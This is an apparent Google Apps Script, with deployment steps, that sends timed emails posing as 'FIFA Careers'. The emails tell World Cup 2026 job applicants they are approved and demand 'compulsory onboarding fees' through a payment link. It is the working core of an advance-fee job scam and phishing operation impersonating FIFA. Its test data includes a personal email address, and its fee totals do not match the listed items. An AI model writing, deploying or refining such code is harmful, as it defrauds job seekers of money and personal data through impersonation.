/**
 * FIFA World Cup 2026 — Email 2 (approval + payment) ~4 hours after application.
 *
 ...
 * 2. Open your FIFA Payment Emails project
 * 3. Replace ALL existing code with this file
 * 4. Save (Ctrl+S)
 * 5. Deploy → Manage deployments → edit → New version → Deploy
 * 6. Add time-driven trigger: sendDueFollowUpEmails → every hour
 */
...
const COMPANY_LOGO_URL   = "https://res.cloudinary.com/dhrjlmfcp/image/upload/v1781028763/email-assets/bt5l2gysvg0fjgfndgbw.png";
const EMAIL_SUBJECT      = "Your FIFA World Cup 2026 Application Has Been Approved";

/* ── PART 1 — Receives POST from careers site ─────────────────────────────── */
...
/* ── PART 2 — Runs every hour via time-driven trigger ────────────────────── */
...
function sendFollowUpEmail(record) {
  ...
  GmailApp.sendEmail(
    record.email,
    EMAIL_SUBJECT,
    plainTextFromRecord(record),
    { htmlBody: html, name: "FIFA Careers" }
  );
}

/* ── PART 3 — Builds the payment URL with base64 encoded payload ─────────── */
...
/* ── PART 4 — Builds the approval email HTML ─────────────────────────────── */
function buildFeeRowsHtml(fees) {
  ...
  return items.map(function(item) {
    return (
      ...
      '<div><p style="margin:0;font-size:15px;font-weight:700;color:#1c2121;">' + escapeHtml(item.label) + '</p>' +
      '<p style="margin:4px 0 0;font-size:13px;color:#505b73;">' + escapeHtml(item.description) + '</p></div>' +
      '<p style="margin:0;font-size:15px;font-weight:700;color:#1c2121;white-space:nowrap;">' + escapeHtml(item.amountLabel) + '</p>' +
      '</div>'
    );
  }).join("");
}
...
function buildApprovalEmailHtml(record) {
  ...
  return (
    ...
    '<img src="' + COMPANY_LOGO_URL + '" width="120" alt="FIFA Careers" style="display:block;max-width:120px;margin:0 auto;border:0;"></div>' +
    ...
    '<p style="font-size:17px;line-height:1.7;">Hi ' + escapeHtml(record.name) + ',</p>' +
    '<p style="font-size:17px;line-height:1.7;">Your application for <strong>' + escapeHtml(record.jobTitle) + '</strong> has been approved.</p>' +
    ...
    '<p style="margin:0;font-size:30px;font-weight:700;color:#051d39;">' + escapeHtml(record.applicationId) + '</p></div>' +

    '<h2 style="font-size:22px;color:#051d39;">When to report</h2>' +
    '<p style="font-size:16px;line-height:1.7;">' + escapeHtml(record.reportingInstruction) + '</p>' +
    '<p style="font-size:16px;line-height:1.7;"><strong>Date:</strong> ' + escapeHtml(record.reportingDateLabel) +
    '<br><strong>Time:</strong> ' + escapeHtml(record.reportingTimeLabel) +
    '<br><strong>Venue:</strong> ' + escapeHtml(record.stadiumName) + ', ' + escapeHtml(record.stadiumAddress) + '</p>' +

    '<h2 style="font-size:22px;color:#051d39;">Compulsory onboarding fees</h2>' +
    '<p style="font-size:16px;line-height:1.7;">' + escapeHtml(record.paymentExplanation) + '</p>' +
    '<div style="margin:18px 0;border:1px solid #e4e8f0;border-radius:8px;overflow:hidden;">' +
    buildFeeRowsHtml(fees) + '</div>' +
    '<p style="font-size:16px;line-height:1.7;"><strong>Compulsory fees:</strong> ' + escapeHtml(fees.compulsoryTotalLabel || "") +
    '<br><strong>Uniform deposit:</strong> ' + escapeHtml(fees.depositTotalLabel || "") +
    '<br><strong>Total due now:</strong> ' + escapeHtml(fees.grandTotalLabel || "") + '</p>' +

    '<div style="text-align:center;margin:34px 0;">' +
    '<a href="' + paymentUrl + '" style="display:inline-block;background:#1277d9;color:#ffffff;text-decoration:none;padding:16px 28px;border-radius:4px;font-size:17px;font-weight:700;">I am ready to make this payment</a></div>' +
...
function testSetup() {
  const testData = {
    postData: {
      contents: JSON.stringify({
        ...
        role:                 "security_exterior",
        applicationId:        "APP-TEST-" + Date.now(),
        jobTitle:             "Manager, Stadium Exterior Security",
        jobLocation:          "Boston, MA",
        hostCity:             "Boston",
        stadiumName:          "Gillette Stadium",
        stadiumAddress:       "Foxborough, MA 02035",
        reportingDateLabel:   "June 10, 2026",
        reportingTimeLabel:   "8:00 AM",
        reportingInstruction: "Please report to the main staff entrance on your reporting date.",
        fees: {
          items: [
            { label: "Staff registration & admin fee", description: "Onboarding, ID card, lanyard", amountLabel: "$30.00" },
            { label: "Background check & security clearance", description: "Enhanced security check", amountLabel: "$45.00" },
            { label: "Security uniform & equipment deposit", description: "Returned after event", amountLabel: "$30.00 deposit" },
          ],
          compulsoryTotalLabel: "$140.00",
          depositTotalLabel:    "$30.00",
          grandTotalLabel:      "$170.00",
        },
        paymentExplanation: "These fees are required to confirm your placement at the FIFA World Cup 2026.",
      })
    }
  };
  ...
  Logger.log("Email will be sent in 4 hours to oladeinderichard1@gmail.com");
}
